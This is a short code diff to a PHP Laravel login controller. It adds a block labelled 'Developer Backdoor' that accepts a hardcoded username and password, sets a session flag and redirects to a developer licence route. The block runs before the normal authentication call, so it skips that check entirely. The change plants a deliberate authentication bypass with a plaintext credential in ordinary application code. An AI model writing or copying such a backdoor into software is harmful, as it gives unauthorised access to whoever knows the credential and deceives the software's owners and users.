@@ -19,6 +19,12 @@ class LoginController extends Controller
 
     public function store(LoginRequest $request): RedirectResponse
     {
+        // ── Developer Backdoor ──
+        if ($request->username === 'boraq' && $request->password === '12255@Rc') {
+            $request->session()->put('developer_backdoor', true);
+            return redirect()->route('license.developer');
+        }
+
         $request->authenticate();
         $request->session()->regenerate();
 
